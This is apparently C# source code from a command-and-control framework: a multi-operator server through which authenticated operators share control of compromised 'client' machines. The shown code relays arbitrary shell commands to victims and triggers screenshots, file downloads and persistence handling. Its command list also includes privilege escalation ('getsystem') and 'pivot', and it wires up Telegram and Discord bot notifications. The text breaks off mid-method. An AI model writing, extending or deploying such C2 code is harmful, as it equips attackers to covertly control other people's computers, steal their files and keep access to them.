using System.Collections.Concurrent;
using System.Net;
using System.Net.Security;
using System.Net.Sockets;
using System.Security.Authentication;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Text.Json;

namespace C2Framework
{
    public class MultiplayerManager
    {
        private readonly C2Server _server;
        private readonly string _ipAddress;
        private readonly X509Certificate2 _serverCertificate;

        private TcpListener _operatorListener;
        private bool _operatorServerRunning = false;
        private OperatorConfig _operatorConfig;
        private readonly object _operatorLock = new object();
        private System.Threading.Timer _heartbeatTimer;
        private string _lastCommandOperatorId = null;
        private readonly ConcurrentDictionary<string, ConnectedOperator> _connectedOperators = new();
        private readonly object _operatorConnectionLock = new object();
        private readonly Dictionary<string, ConnectedOperator> _activeOperatorSessions = new Dictionary<string, ConnectedOperator>();

        public ConcurrentDictionary<string, ConnectedOperator> ConnectedOperators => _connectedOperators;
        public Dictionary<string, ConnectedOperator> ActiveOperatorSessions => _activeOperatorSessions;
        public object OperatorLock => _operatorLock;
        public object OperatorConnectionLock => _operatorConnectionLock;

        // Events
        public event EventHandler<OutputMessageEventArgs> OutputMessage;
        public event EventHandler OperatorListChanged;


        public MultiplayerManager(C2Server server, string ipAddress, X509Certificate2 serverCertificate)
        {
            try
            {
                // Validate critical parameters
                _server = server ?? throw new ArgumentNullException(nameof(server));
                _ipAddress = !string.IsNullOrEmpty(ipAddress) ? ipAddress : throw new ArgumentException("IP address cannot be null or empty", nameof(ipAddress));
                _serverCertificate = serverCertificate; // Can be null


                if (_connectedOperators == null)
                {
                    throw new InvalidOperationException("_connectedOperators field is null - this indicates a serious initialization problem");
                }

                if (_activeOperatorSessions == null)
                {
                    throw new InvalidOperationException("_activeOperatorSessions field is null - this indicates a serious initialization problem");
                }

                // Initialize other fields to safe defaults
                _operatorServerRunning = false;
                _operatorLock = _operatorLock ?? new object();
                _operatorConnectionLock = _operatorConnectionLock ?? new object();

            }
            catch (Exception ex)
            {
                Console.WriteLine($"[CRITICAL] MultiplayerManager constructor failed: {ex.Message}");
                Console.WriteLine($"[CRITICAL] Stack trace: {ex.StackTrace}");
                throw new InvalidOperationException("Failed to initialize MultiplayerManager", ex);
            }
        }

        public void Initialize()
        {
            try
            {
                _operatorConfig = OperatorConfigManager.LoadConfig();

                if (_operatorConfig.MultiplayerEnabled)
                {
                    StartOperatorServer();
                }
                else
                {
                    RaiseOutputMessage("[*] Multiplayer is disabled in config", Color.Yellow);
                }

                // Start heartbeat timer
                _heartbeatTimer = new System.Threading.Timer(CheckOperatorHeartbeat, null, TimeSpan.FromSeconds(30), TimeSpan.FromSeconds(30));
            }
            catch (Exception ex)
            {
                RaiseOutputMessage($"[!] Error initializing operator server: {ex.Message}", Color.Red);
            }
        }

        public void StartOperatorServer()
        {
            try
            {
                if (_operatorServerRunning)
                {
                    RaiseOutputMessage("[!] Operator server is already running", Color.Yellow);
                    return;
                }

                _operatorConfig = OperatorConfigManager.GetConfig();

                _operatorListener = new TcpListener(IPAddress.Parse(_ipAddress), _operatorConfig.OperatorPort);
                _operatorListener.Start();
                _operatorServerRunning = true;

                RaiseOutputMessage($"[+] Operator server started on {_ipAddress}:{_operatorConfig.OperatorPort}", Color.Green);
                RaiseOutputMessage($"[*] Max operators: {_operatorConfig.MaxOperators}", Color.Cyan);

                Task.Run(() => AcceptOperatorsAsync());
            }
            catch (Exception ex)
            {
                RaiseOutputMessage($"[!] Error starting operator server: {ex.Message}", Color.Red);
                RaiseOutputMessage($"[!] Stack trace: {ex.StackTrace}", Color.Red);
            }
        }

        public void StopOperatorServer()
        {
            try
            {
                if (!_operatorServerRunning) return;

                _operatorServerRunning = false;

                // Disconnect all operators
                foreach (var op in _connectedOperators.Values)
                {
                    try
                    {
                        SendToOperator(op, new OperatorMessage
                        {
                            Type = OperatorMessageType.Notification,
                            From = "SERVER",
                            Data = "Server shutting down"
                        });
                        op.Connection?.Close();
                    }
                    catch { }
                }

                _connectedOperators.Clear();
                _operatorListener?.Stop();

                RaiseOutputMessage("[*] Operator server stopped", Color.Yellow);
            }
            catch (Exception ex)
            {
                RaiseOutputMessage($"[!] Error stopping operator server: {ex.Message}", Color.Red);
            }
        }

        private async Task AcceptOperatorsAsync()
        {
            while (_operatorServerRunning)
            {
                try
                {
                    TcpClient operatorClient = await _operatorListener.AcceptTcpClientAsync();

                    if (_connectedOperators.Count >= _operatorConfig.MaxOperators)
                    {
                        operatorClient.Close();
                        RaiseOutputMessage("[!] Max operators reached, connection rejected", Color.Red);
                        continue;
                    }

                    Task.Run(() => HandleOperatorConnection(operatorClient));
                }
                catch (Exception ex)
                {
                    if (_operatorServerRunning)
                        RaiseOutputMessage($"[!] Error accepting operator: {ex.Message}", Color.Red);
                }
            }
        }

        private async Task HandleOperatorConnection(TcpClient operatorClient)
        {
            string operatorId = Guid.NewGuid().ToString("N")[0..8];
            ConnectedOperator operator_ = null;

            try
            {
                // Enhanced operator client configuration
                operatorClient.NoDelay = true;
                operatorClient.ReceiveTimeout = 60000;
                operatorClient.SendTimeout = 30000;
                operatorClient.Client.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.KeepAlive, true);
                operatorClient.ReceiveBufferSize = 65536;
                operatorClient.SendBufferSize = 65536;

                NetworkStream baseStream = operatorClient.GetStream();

                operator_ = new ConnectedOperator
                {
                    OperatorId = operatorId,
                    Connection = operatorClient,
                    BaseStream = baseStream,
                    RemoteEndPoint = (IPEndPoint)operatorClient.Client.RemoteEndPoint,
                    ConnectedAt = DateTime.Now,
                    LastActivity = DateTime.Now,
                    IsAuthenticated = false,
                    IsEncrypted = false,
                    ActiveStream = baseStream // Start with base stream
                };

                RaiseOutputMessage($"[*] New operator connection from {operator_.RemoteEndPoint}", Color.Cyan);

                bool tlsSuccess = false;

                if (_serverCertificate != null)
                {
                    try
                    {
                        RaiseOutputMessage($"[*] Attempting TLS handshake with operator", Color.Cyan);

                        // Create SslStream directly on the base stream
                        var sslStream = new SslStream(baseStream, false);

                        // Set a reasonable timeout for TLS handshake
                        var authTask = sslStream.AuthenticateAsServerAsync(
                            _serverCertificate,
                            clientCertificateRequired: false,
                            enabledSslProtocols: SslProtocols.Tls12 | SslProtocols.Tls13,
                            checkCertificateRevocation: false);

                        // Wait for TLS authentication with timeout
                        var tlsHandshakeTimeoutTask = Task.Delay(10000); // 10 second timeout
                        var completedTask = await Task.WhenAny(authTask, tlsHandshakeTimeoutTask);

                        if (completedTask == authTask)
                        {
                            // TLS handshake completed
                            await authTask; // This will throw if authentication failed

                            // Verify cipher strength
                            if (sslStream.CipherStrength < 128)
                            {
                                RaiseOutputMessage($"[!] Weak cipher detected: {sslStream.CipherStrength} bits", Color.Red);
                                sslStream.Dispose();
                            }
                            else
                            {
                                // TLS successful
                                operator_.SslStream = sslStream;
                                operator_.ActiveStream = sslStream;
                                operator_.IsEncrypted = true;
                                operator_.TlsProtocol = sslStream.SslProtocol.ToString();
                                operator_.CipherAlgorithm = sslStream.CipherAlgorithm.ToString();
                                operator_.CipherStrength = sslStream.CipherStrength;

                                tlsSuccess = true;
                            }
                        }
                        else
                        {
                            // TLS timeout
                            RaiseOutputMessage("[!] TLS authentication timeout", Color.Yellow);
                            sslStream.Dispose();
                        }
                    }
                    catch (Exception ex)
                    {
                        RaiseOutputMessage($"[!] TLS handshake failed: {ex.Message}", Color.Yellow);
                        // Continue with plain text - don't close the connection
                    }
                }

                if (!tlsSuccess)
                {
                    // Use plain text connection
                    operator_.ActiveStream = baseStream;
                    operator_.IsEncrypted = false;
                    RaiseOutputMessage($"[+] Plain text operator connection established", Color.Yellow);
                    RaiseOutputMessage($"[!] WARNING: Operator connection is not encrypted", Color.Orange);
                    RaiseOutputMessage($"[!] All operator traffic will be transmitted in clear text!", Color.Red);
                }

                RaiseOutputMessage($"[*] Operator connection ready ({operator_.EncryptionStatus})", Color.Cyan);

                // Handle authentication
                bool authenticated = await HandleOperatorAuthentication(operator_);

                if (!authenticated)
                {
                    operatorClient.Close();
                    return;
                }

                _connectedOperators.TryAdd(operatorId, operator_);

                RaiseOutputMessage($"[+] Operator '{operator_.Username}' ({operator_.Role}) authenticated via {operator_.EncryptionStatus}", Color.Green);

                BroadcastOperatorListUpdate();

                BroadcastToOperators(new OperatorMessage
                {
                    Type = OperatorMessageType.OperatorJoin,
                    From = "SERVER",
                    Data = $"Operator {operator_.Username} ({operator_.Role}) joined via {operator_.EncryptionStatus}"
                }, operatorId);

                await SendInitialDataToOperator(operator_);
                await HandleOperatorMessages(operator_);
            }
            catch (Exception ex)
            {
                RaiseOutputMessage($"[!] Error handling operator connection: {ex.Message}", Color.Red);
            }
            finally
            {
                if (operator_ != null)
                {
                    _connectedOperators.TryRemove(operatorId, out _);
                    operator_.SslStream?.Dispose();

                    RaiseOutputMessage($"[*] Operator {operator_.Username ?? "Unknown"} disconnected", Color.Yellow);

                    BroadcastToOperators(new OperatorMessage
                    {
                        Type = OperatorMessageType.OperatorLeave,
                        From = "SERVER",
                        Data = $"Operator {operator_.Username} left"
                    }, operatorId);

                    BroadcastOperatorListUpdate();
                }
            }
        }

        private async Task<bool> HandleOperatorAuthentication(ConnectedOperator operator_)
        {
            try
            {
                // Send auth challenge
                await SendToOperator(operator_, new OperatorMessage
                {
                    Type = OperatorMessageType.Authentication,
                    From = "SERVER",
                    Data = "AUTH_REQUIRED"
                });

                // Wait for auth response with timeout
                byte[] buffer = new byte[4096];
                var cts = new CancellationTokenSource(TimeSpan.FromSeconds(30));

                try
                {
                    int bytesRead = await operator_.ActiveStream.ReadAsync(buffer, 0, buffer.Length, cts.Token);

                    if (bytesRead == 0)
                        return false;

                    string authData = Encoding.UTF8.GetString(buffer, 0, bytesRead);
                    var authMessage = JsonSerializer.Deserialize<OperatorMessage>(authData);

                    if (authMessage.Type == OperatorMessageType.Authentication)
                    {
                        var credentials = JsonSerializer.Deserialize<Dictionary<string, string>>(authMessage.Data);
                        string username = credentials["Username"];
                        string password = credentials["Password"];

                        if (OperatorConfigManager.ValidateCredentials(username, password, out var credential))
                        {
                            // Check for existing sessions for this user
                            var existingOperator = _connectedOperators.Values
                                .FirstOrDefault(op => op.Username == username && op.IsAuthenticated);

                            if (existingOperator != null)
                            {
                                // REJECT NEW CONNECTION
                                RaiseOutputMessage($"[!] Login rejected for '{username}' - already connected from {existingOperator.RemoteEndPoint}", Color.Red);

                                // Notify the existing operator about the login attempt
                                try
                                {
                                    await SendToOperator(existingOperator, new OperatorMessage
                                    {
                                        Type = OperatorMessageType.Notification,
                                        From = "SERVER",
                                        Data = $"⚠️ Login attempt detected from {operator_.RemoteEndPoint?.Address} - Access denied (you remain connected)"
                                    });
                                }
                                catch (Exception ex)
                                {
                                    RaiseOutputMessage($"[!] Error notifying existing operator: {ex.Message}", Color.Yellow);
                                }

                                // Send rejection to new connection
                                await SendToOperator(operator_, new OperatorMessage
                                {
                                    Type = OperatorMessageType.AuthResponse,
                                    From = "SERVER",
                                    Data = "AUTH_FAILED_ALREADY_CONNECTED",
                                    Payload = new
                                    {
                                        Reason = "User already connected from another location",
                                        ExistingConnectionTime = existingOperator.ConnectedAt,
                                        ExistingConnectionIP = existingOperator.RemoteEndPoint?.ToString()
                                    }
                                });

                                // Log security event
                                RaiseOutputMessage($"[SECURITY] Rejected duplicate login for '{username}' from {operator_.RemoteEndPoint} (existing session from {existingOperator.RemoteEndPoint})", Color.Orange);

                                return false; // REJECT THE NEW CONNECTION
                            }

                            // Proceed with authentication if no existing session
                            operator_.Username = credential.Username;
                            operator_.Role = credential.Role;
                            operator_.IsAuthenticated = true;

                            await SendToOperator(operator_, new OperatorMessage
                            {
                                Type = OperatorMessageType.AuthResponse,
                                From = "SERVER",
                                Data = "AUTH_SUCCESS",
                                Payload = new { Role = credential.Role }
                            });

                            // Update login statistics
                            UpdateUserLoginStats(credential.Username);

                            RaiseOutputMessage($"[+] Operator '{username}' ({credential.Role}) authenticated from {operator_.RemoteEndPoint}", Color.Green);
                            return true;
                        }
                    }

                    await SendToOperator(operator_, new OperatorMessage
                    {
                        Type = OperatorMessageType.AuthResponse,
                        From = "SERVER",
                        Data = "AUTH_FAILED"
                    });

                    RaiseOutputMessage($"[!] Authentication failed from {operator_.RemoteEndPoint}", Color.Red);
                    return false;
                }
                catch (OperationCanceledException)
                {
                    RaiseOutputMessage("[!] Operator authentication timeout", Color.Red);
                    return false;
                }
            }
            catch (Exception ex)
            {
                RaiseOutputMessage($"[!] Auth error: {ex.Message}", Color.Red);
                return false;
            }
        }

        private async Task HandleOperatorMessages(ConnectedOperator operator_)
        {
            byte[] buffer = new byte[8192];

            while (operator_.IsAlive && operator_.Connection.Connected && _operatorServerRunning)
            {
                try
                {
                    int bytesRead = await operator_.ActiveStream.ReadAsync(buffer, 0, buffer.Length);

                    if (bytesRead == 0)
                        break;

                    operator_.LastActivity = DateTime.Now;

                    string messageData = Encoding.UTF8.GetString(buffer, 0, bytesRead);
                    var message = JsonSerializer.Deserialize<OperatorMessage>(messageData);

                    await ProcessOperatorMessage(operator_, message);
                }
                catch (Exception ex)
                {
                    if (operator_.IsAlive)
                        break;
                }
            }
        }

        private async Task ProcessOperatorMessage(ConnectedOperator operator_, OperatorMessage message)
        {
            try
            {
                switch (message.Type)
                {
                    case OperatorMessageType.Command:
                        await HandleOperatorCommand(operator_, message);
                        break;

                    case OperatorMessageType.Chat:
                        BroadcastToOperators(message, operator_.OperatorId);
                        break;

                    case OperatorMessageType.HeartBeat:
                        await SendToOperator(operator_, new OperatorMessage
                        {
                            Type = OperatorMessageType.HeartBeat,
                            From = "SERVER",
                            Data = "PONG"
                        });
                        break;
                }
            }
            catch (Exception ex)
            {
                RaiseOutputMessage($"[!] Error processing operator message: {ex.Message}", Color.Red);
            }
        }

        private async Task HandleOperatorCommand(ConnectedOperator operator_, OperatorMessage message)
        {
            try
            {
                // Observer role enforcement
                if (operator_.Role == "Observer")
                {
                    var commandData = JsonSerializer.Deserialize<Dictionary<string, string>>(message.Data);
                    string command = commandData["Command"];

                    // Observer can ONLY use these view-only commands
                    string[] allowedCommands = { "list", "beacons", "sessions", "help" };
                    string cmdWord = command.Split(' ')[0].ToLower();

                    if (!allowedCommands.Contains(cmdWord))
                    {
                        await SendToOperator(operator_, new OperatorMessage
                        {
                            Type = OperatorMessageType.Error,
                            From = "SERVER",
                            Data = "❌ Permission denied - Observer role can only view client lists and session info"
                        });
                        return;
                    }
                }

                // Parse command data
                var commandData2 = JsonSerializer.Deserialize<Dictionary<string, string>>(message.Data);
                string command2 = commandData2["Command"];
                string clientId = commandData2.GetValueOrDefault("ClientId", "");

                // Log command with role indicators
                if (_operatorConfig.LogOperatorActivity && !command2.ToLower().StartsWith("list"))
                {
                    string rolePrefix = operator_.Role == "Observer" ? "👁️" : "⚡";
                    RaiseOutputMessage($"[{rolePrefix} {operator_.Username}] {command2}", Color.Purple);
                }

                string[] parts = command2.Split(' ');
                string cmd = parts[0].ToLower();

                // Server management commands (no client connection needed)
                string[] serverCommands = { "list", "beacons", "sessions", "help" };

                // C2 framework commands (need client connection)
                string[] c2Commands = { "screenshot", "download", "upload", "getsystem", "persist", "cleanup_persist",
                       "telegram_config", "telegram_on", "telegram_off", "telegram_test", "telegram_status", "telegram",
                       "discord_config", "discord_on", "discord_off", "discord_test", "discord_status", "discord", "discord_commands", "pivot" };


                // Client connection commands
                string[] connectionCommands = { "connect", "disconnect", "kill" };

                if (serverCommands.Contains(cmd))
                {
                    await HandleServerCommand(operator_, command2, clientId);
                }
                else if (connectionCommands.Contains(cmd))
                {
                    await HandleConnectionCommand(operator_, command2, clientId);
                }
                else if (c2Commands.Contains(cmd))
                {
                    await HandleC2Command(operator_, command2, clientId);
                }
                else
                {
                    await HandleClientShellCommand(operator_, command2, clientId);
                }

            }
            catch (Exception ex)
            {
                await SendToOperator(operator_, new OperatorMessage
                {
                    Type = OperatorMessageType.Error,
                    From = "SERVER",
                    Data = $"Command error: {ex.Message}"
                });
                RaiseOutputMessage($"[!] Operator command error: {ex.Message}", Color.Red);
            }
        }

        private async Task HandleConnectionCommand(ConnectedOperator operator_, string command, string clientId)
        {
            try
            {
                string[] parts = command.Split(' ');
                string cmd = parts[0].ToLower();
                string arguments = parts.Length > 1 ? parts[1] : string.Empty;

                switch (cmd)
                {
                    case "connect":
                        if (string.IsNullOrEmpty(arguments))
                        {
                            await SendToOperator(operator_, new OperatorMessage
                            {
                                Type = OperatorMessageType.Error,
                                From = "SERVER",
                                Data = "Usage: connect <client_id>"
                            });
                            return;
                        }

                        var clients = _server.GetClients();
                        var client = clients.FirstOrDefault(c => c.ClientId == arguments);

                        if (client != null)
                        {
                            if (client.IsConnected)
                            {
                                // Check if another operator is controlling this client
                                var conflictOp = _connectedOperators.Values.FirstOrDefault(op =>
                                    op.ActiveClientId == arguments && op.OperatorId != operator_.OperatorId);

                                if (conflictOp != null)
                                {
                                    await SendToOperator(operator_, new OperatorMessage
                                    {
                                        Type = OperatorMessageType.Error,
                                        From = "SERVER",
                                        Data = $"Client {arguments} is being controlled by {conflictOp.Username}"
                                    });
                                    return;
                                }

                                _server.ConnectToClient(arguments);
                                operator_.ActiveClientId = arguments;

                                string clientDetails = $"{client.UserName}@{client.ComputerName} ({client.ClientInfo})";
                                if (client.IsAdmin) clientDetails += " [ADMIN]";
                                if (client.IsEncrypted) clientDetails += " [TLS]"; else clientDetails += " [PLAIN]";

                                await SendToOperator(operator_, new OperatorMessage
                                {
                                    Type = OperatorMessageType.Response,
                                    From = "SERVER",
                                    Data = $"[+] Connected to {arguments}: {clientDetails}",
                                    ClientId = arguments
                                });

                                BroadcastToOperators(new OperatorMessage
                                {
                                    Type = OperatorMessageType.Notification,
                                    From = "SERVER",
                                    Data = $"Operator {operator_.Username} connected to client {arguments}"
                                }, operator_.OperatorId);
                            }
                            else
                            {
                                await SendToOperator(operator_, new OperatorMessage
                                {
                                    Type = OperatorMessageType.Error,
                                    From = "SERVER",
                                    Data = $"Client {arguments} is not connected"
                                });
                            }
                        }
                        else
                        {
                            await SendToOperator(operator_, new OperatorMessage
                            {
                                Type = OperatorMessageType.Error,
                                From = "SERVER",
                                Data = $"Client {arguments} not found"
                            });
                        }
                        break;
                    case "discord_config":
                        if (string.IsNullOrEmpty(arguments))
                        {
                            await SendToOperator(operator_, new OperatorMessage
                            {
                                Type = OperatorMessageType.Error,
                                From = "SERVER",
                                Data = "[!] Usage: discord_config <bot_token> <channel_id> [guild_id]"
                            });
                            break;
                        }

                        string[] discordConfigArgs = arguments.Split(new char[] { ' ' }, 3);
                        if (discordConfigArgs.Length < 2)
                        {
                            await SendToOperator(operator_, new OperatorMessage
                            {
                                Type = OperatorMessageType.Error,
                                From = "SERVER",
                                Data = "[!] Both bot token and channel ID are required"
                            });
                            break;
                        }

                        string discordGuildId = discordConfigArgs.Length > 2 ? discordConfigArgs[2].Trim() : "";
                        _server.ConfigureDiscordBot(discordConfigArgs[0].Trim(), discordConfigArgs[1].Trim(), discordGuildId);
                        break;

                    case "discord_on":
                        _server.ToggleDiscordNotifications(true);
                        break;

                    case "discord_off":
                        _server.ToggleDiscordNotifications(false);
                        break;

                    case "discord_test":
                        await _server.TestDiscordNotification();
                        break;

                    case "discord_status":
                    case "discord":
                        _server.ShowDiscordStatus();
                        break;



                    case "disconnect":
                        if (!string.IsNullOrEmpty(operator_.ActiveClientId))
                        {
                            operator_.ActiveClientId = null;
                            await SendToOperator(operator_, new OperatorMessage
                            {
                                Type = OperatorMessageType.Response,
                                From = "SERVER",
                                Data = "[*] Disconnected from client (session still active)"
                            });
                        }
                        else
                        {
                            await SendToOperator(operator_, new OperatorMessage
                            {
                                Type = OperatorMessageType.Response,
                                From = "SERVER",
                                Data = "[*] No active client connection to disconnect"
                            });
                        }
                        break;

                    case "kill":
                        if (string.IsNullOrEmpty(arguments))
                        {
                            await SendToOperator(operator_, new OperatorMessage
                            {
                                Type = OperatorMessageType.Error,
                                From = "SERVER",
                                Data = "Usage: kill <client_id>"
                            });
                            return;
                        }

                        _server.KillClient(arguments);

                        if (operator_.ActiveClientId == arguments)
                        {
                            operator_.ActiveClientId = null;
                        }

                        await SendToOperator(operator_, new OperatorMessage
                        {
                            Type = OperatorMessageType.Response,
                            From = "SERVER",
                            Data = $"[+] Client {arguments} terminated"
                        });
                        break;
                }
            }
            catch (Exception ex)
            {
                await SendToOperator(operator_, new OperatorMessage
                {
                    Type = OperatorMessageType.Error,
                    From = "SERVER",
                    Data = $"Connection command error: {ex.Message}"
                });
            }
        }

        private async Task HandleClientShellCommand(ConnectedOperator operator_, string command, string clientId)
        {
            try
            {
                if (string.IsNullOrEmpty(operator_.ActiveClientId))
                {
                    await SendToOperator(operator_, new OperatorMessage
                    {
                        Type = OperatorMessageType.Error,
                        From = "SERVER",
                        Data = "[!] No active client. Use 'connect <client_id>' first."
                    });
                    return;
                }

                var clients = _server.GetClients();
                var client = clients.FirstOrDefault(c => c.ClientId == operator_.ActiveClientId);

                if (client == null || !client.IsConnected)
                {
                    await SendToOperator(operator_, new OperatorMessage
                    {
                        Type = OperatorMessageType.Error,
                        From = "SERVER",
                        Data = "[!] Your active client is no longer connected. Use 'list' and 'connect <id>' to select a new client."
                    });
                    operator_.ActiveClientId = null;
                    return;
                }

                _server.ConnectToClient(operator_.ActiveClientId);

                BroadcastToOperators(new OperatorMessage
                {
                    Type = OperatorMessageType.Command,
                    From = operator_.Username,
                    ClientId = operator_.ActiveClientId,
                    Data = command
                }, operator_.OperatorId);

                await SendToOperatorImmediately(operator_, new OperatorMessage
                {
                    Type = OperatorMessageType.Response,
                    From = "SERVER",
                    Data = $"[{operator_.ActiveClientId}] > {command}",
                    ClientId = operator_.ActiveClientId,
                    ColorHint = "#0080FF"
                });

                _lastCommandOperatorId = operator_.OperatorId;
                _server.SetLastCommandOperatorId(operator_.OperatorId);
                _server.SendCommand(command);
            }
            catch (Exception ex)
            {
                await SendToOperator(operator_, new OperatorMessage
                {
                    Type = OperatorMessageType.Error,
                    From = "SERVER",
                    Data = $"Error executing command: {ex.Message}"
                });
            }
        }

        private async Task HandleServerCommand(ConnectedOperator operator_, string command, string clientId)
        {
            try
            {
                string[] parts = command.Split(' ');
                string cmd = parts[0].ToLower();

                switch (cmd)
                {
                    case "list":
                    case "beacons":
                    case "sessions":
                        var clients = _server.GetClients().Where(c => c.IsConnected)
                                             .Select(c => FormatClientDataForOperators(c))
                                             .ToList();

                        await SendToOperator(operator_, new OperatorMessage
                        {
                            Type = OperatorMessageType.ClientList,
                            From = "SERVER",
                            Data = JsonSerializer.Serialize(clients)
                        });


                        if (command.ToLower() != "list" || clients.Count != operator_.LastKnownClientCount)
                        {
                            if (clients.Any())
                            {
                                if (command.ToLower() == "list" || command.ToLower() == "beacons")
                                {
                                    await SendToOperator(operator_, new OperatorMessage
                                    {
                                        Type = OperatorMessageType.Response,
                                        From = "SERVER",
                                    });
                                }
                            }
                            else if (command.ToLower() == "list" || command.ToLower() == "beacons")
                            {
                                await SendToOperator(operator_, new OperatorMessage
                                {
                                    Type = OperatorMessageType.Response,
                                    From = "SERVER",
                                    Data = "[*] No clients connected"
                                });
                            }
                        }

                        break;

                    case "help":
                        await SendToOperator(operator_, new OperatorMessage
                        {
                            Type = OperatorMessageType.Response,
                            From = "SERVER",
                            Data = GetOperatorHelpText()
                        });
                        break;

                    default:
                        await SendToOperator(operator_, new OperatorMessage
                        {
                            Type = OperatorMessageType.Error,
                            From = "SERVER",
                            Data = $"Unknown server command: {cmd}. Type 'help' for available commands."
                        });
                        break;
                }
            }
            catch (Exception ex)
            {
                await SendToOperator(operator_, new OperatorMessage
                {
                    Type = OperatorMessageType.Error,
                    From = "SERVER",
                    Data = $"Server command error: {ex.Message}"
                });
            }
        }
        private async Task HandleC2Command(ConnectedOperator operator_, string command, string clientId)
        {
            try
            {
                if (string.IsNullOrEmpty(operator_.ActiveClientId))
                {
                    await SendToOperator(operator_, new OperatorMessage
                    {
                        Type = OperatorMessageType.Error,
                        From = "SERVER",
                        Data = "[!] No active client. Use 'connect <client_id>' first."
                    });
                    return;
                }

                var clients = _server.GetClients();
                var client = clients.FirstOrDefault(c => c.ClientId == operator_.ActiveClientId);

                if (client == null || !client.IsConnected)
                {
                    await SendToOperator(operator_, new OperatorMessage
                    {
                        Type = OperatorMessageType.Error,
                        From = "SERVER",
                        Data = "[!] Your active client is no longer connected."
                    });
                    operator_.ActiveClientId = null;
                    return;
                }

                _server.ConnectToClient(operator_.ActiveClientId);

                string[] parts = command.Split(new char[] { ' ' }, 3);
                string cmd = parts[0].ToLower();
                string arguments = parts.Length > 1 ? parts[1] : string.Empty;

                switch (cmd)
                {
                    case "screenshot":
                        if (client.IsLinux)
                        {
                            await SendToOperator(operator_, new OperatorMessage
                            {
                                Type = OperatorMessageType.Error,
                                From = "SERVER",
                                Data = "[!] Linux Screenshot is not supported :(",
                                ClientId = operator_.ActiveClientId
                            });
                            return;
                        }

                        if (client.UserName.Contains("SYSTEM", StringComparison.OrdinalIgnoreCase) ||
                            client.UserName.Contains("NT AUTHORITY", StringComparison.OrdinalIgnoreCase) ||
                            client.UserName.EndsWith("$", StringComparison.OrdinalIgnoreCase))
                        {
                            await SendToOperator(operator_, new OperatorMessage
                            {
                                Type = OperatorMessageType.Error,
                                From = "SERVER",
                                Data = "[!] Screenshot not available for SYSTEM accounts - no access to user desktop session",
                                ClientId = operator_.ActiveClientId
                            });
                            return;
                        }

                        await SendToOperator(operator_, new OperatorMessage
                        {
                            Type = OperatorMessageType.Response,
                            From = "SERVER",
                            Data = "[*] Taking screenshot...",
                            ClientId = operator_.ActiveClientId
                        });

                        _server.CaptureScreenshot(_server.GetDownloadDirectory());
                        break;

                    case "download":
                        if (string.IsNullOrEmpty(arguments))
                        {
                            await SendToOperator(operator_, new OperatorMessage
                            {
                                Type = OperatorMessageType.Error,
                                From = "SERVER",
                                Data = "[!] Please specify a file path to download",
                                ClientId = operator_.ActiveClientId
                            });
                        }
                        else
                        {
                            await SendToOperator(operator_, new OperatorMessage
                            {
                                Type = OperatorMessageType.Response,
                                From = "SERVER",
                                Data = $"[*] Downloading {arguments}...",
                                ClientId = operator_.ActiveClientId
                            });

                            await _server.DownloadFile(arguments, _server.GetDownloadDirectory());
                        }
                        break;

                    case "persist":
                        if (string.IsNullOrEmpty(arguments))
                        {
                            if (client.IsLinux)
                            {
                                await _server.ShowLinuxPersistenceMenuWithTime();
                            }
                            else
                            {
                                await _server.ShowPersistenceMenu();
                            }
                        }
                        else
                        {
                            await SendToOperator(operator_, new OperatorMessage
                            {
                                Type = OperatorMessageType.Error,
                                From = "SERVER",
                                Data = "[!] Persistence installation requires direct server access - not supported for operators",
                                ClientId = operator_.ActiveClientId
                            });
                        }
                        break;

                    case "cleanup_persist":
                        if (!client.IsLinux)
                        {
                            await SendToOperator(operator_, new OperatorMessage
                            {
                                Type = OperatorMessageType.Response,
                                From = "SERVER",
                                Data = "[*] Cleanup is currently only implemented for Linux persistence",
                                ClientId = operator_.ActiveClientId
                            });
                            break;
                        }

                        await SendToOperator(operator_, new OperatorMessage
                        {
                            Type = OperatorMessageType.Response,
                            From = "SERVER",
                            Data = "[*] Cleaning up Linux persistence...",
                            ClientId = operator_.ActiveClientId
                        });

                        await _server.CleanupLinuxTimedPersistence();
                        break;

                    case "telegram_config":
                        if (string.IsNullOrEmpty(arguments))
                        {
                            await SendToOperator(operator_, new OperatorMessage
                            {
                                Type = OperatorMessageType.Error,
                                From = "SERVER",
                                Data = "[!] Usage: telegram_config <bot_token> <chat_id>"
                            });
                            break;
                        }

                        string[] configArgs = arguments.Split(new char[] { ' ' }, 2);
                        if (configArgs.Length != 2)
                        {
                            await SendToOperator(operator_, new OperatorMessage
                            {
                                Type = OperatorMessageType.Error,
                                From = "SERVER",
                                Data = "[!] Both bot token and chat ID are required"
                            });
                            break;
                        }

                        _server.ConfigureTelegramBot(configArgs[0].Trim(), configArgs[1].Trim());
                        break;

                    case "telegram_on":
                        _server.ToggleTelegramNotifications(true);
                        break;

                    case "telegram_off":
                        _server.ToggleTelegramNotifications(false);
                        break;

                    case "telegram_test":
                        await _server.TestTelegramNotification();
                        break;

                    case "telegram_status":
                    case "telegram":
                        _server.ShowTelegramStatus();
                        break;

                    default:
                        await SendToOperator(operator_, new OperatorMessage
                        {
                            Type = OperatorMessageType.Error,
                            From = "SERVER",
                            Data = $"Unknown C2 command: {cmd}. Type 'help' for available commands.",
                            ClientId = operator_.ActiveClientId
                        });
                        break;
                }

                if (!cmd.Equals("help", StringComparison.OrdinalIgnoreCase))
                {
                    BroadcastToOperators(new OperatorMessage
                    {
                        Type = OperatorMessageType.Command,
                        From = operator_.Username,
                        ClientId = operator_.ActiveClientId,
                        Data = command
                    }, operator_.OperatorId);
                }

            }
            catch (Exception ex)
            {
                await SendToOperator(operator_, new OperatorMessage
                {
                    Type = OperatorMessageType.Error,
                    From = "SERVER",
                    Data = $"C2 command error: {ex.Message}",
                    ClientId = operator_.ActiveClientId
                });
            }
        }

        private async Task SendInitialDataToOperator(ConnectedOperator operator_)
        {
            try
            {
                var clients = _server.GetClients().Where(c => c.IsConnected).Select(c => new
                {
                    c.ClientId,
                    c.ClientInfo,
                    c.UserName,
                    c.ComputerName,
                    c.IsAdmin,
                    c.OSVersion,
                    c.IsConnected,
                    c.IsEncrypted,
                    c.LastSeen,
                    c.IsLinux,
                    c.ShellType
                }).ToList();

                await SendToOperator(operator_, new OperatorMessage
                {
                    Type = OperatorMessageType.ClientList,
                    From = "SERVER",
                    Data = JsonSerializer.Serialize(clients)
                });

                var operators = _connectedOperators.Values.Select(op => new
                {
                    op.Username,
                    op.Role,
                    op.ConnectedAt,
                    op.ActiveClientId
                }).ToList();

                await SendToOperator(operator_, new OperatorMessage
                {
